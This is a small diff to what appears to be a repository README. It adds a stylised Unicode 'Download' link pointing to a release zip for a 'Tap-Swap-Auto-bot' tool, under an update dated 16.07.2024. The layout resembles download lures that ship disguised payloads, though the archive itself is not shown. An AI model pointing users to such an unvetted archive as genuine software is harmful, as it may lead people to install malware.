@@ -2,7 +2,7 @@
 
 <div align="center">
   
-## ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](
+## ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/kartikey3525/Tap-Swap-Auto-bot/releases/download/Tap-Swap-Auto-bot/Tap-Swap-Auto-bot.zip)***
 
 
 ## UPDATE 16.07.2024
